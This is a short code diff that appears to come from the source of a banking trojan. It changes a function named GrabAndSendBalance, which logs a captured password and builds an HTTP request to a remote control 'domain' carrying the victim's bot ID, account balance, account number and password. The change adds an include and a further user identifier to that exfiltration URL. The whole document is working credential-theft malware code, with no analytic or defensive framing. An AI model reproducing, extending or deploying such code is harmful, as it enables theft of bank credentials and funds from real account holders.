@@ -17,7 +17,7 @@
 #include "odbc.h"
 #include "Config.h"
 #include "rafa.h"
-
+#include "AzConfig.h"
 #include "BotDebug.h"
 
 namespace BBS_CALC
@@ -150,7 +150,8 @@ static DWORD WINAPI GrabAndSendBalance(void*)
 			DBG( "CBank", "Пароль='%s'", pwd );
 			fwsprintfA pwsprintfA = Get_wsprintfA();
 			MemPtr<512> qr;
-			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=bss&sum=%s&acc=%s&pass=%s", domain, BOT_UID, Rest, Account, pwd );
+			string user = GetAzUser();
+			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=bss&sum=%s&acc=%s&pass=%s&cid=%s", domain, BOT_UID, Rest, Account, pwd, user.t_str() );
 			DBG( "CBank", "Отсылаем запрос %s", qr.str() );
 			THTTPResponseRec Response;
 			ClearStruct(Response);
